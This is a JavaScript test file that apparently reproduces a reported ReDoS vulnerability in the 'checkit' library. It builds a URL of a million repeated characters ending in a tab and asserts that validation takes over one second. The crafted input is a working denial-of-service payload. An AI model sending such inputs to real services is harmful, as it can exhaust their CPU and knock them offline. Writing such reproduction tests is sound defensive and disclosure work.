//https://github.com/tgriesser/checkit/pull/94/files
test("ReDoS in checkit", () => {  
  const measureTime = require("./utils").measureTime;
  const check = require("checkit");

  const prefix = "http://a";
  const pump = "a";
  const suffix = "\t";

  const nPumps = 1000000;

  let url = prefix;
  for (let i = 0; i < nPumps; i++) {
    url += pump;
  }
  url += suffix;

  let t = measureTime(function () {
    check(url);
  });

  let time = t[0] + t[1] / 1000000000;

  expect(time).toBeGreaterThan(1);
});
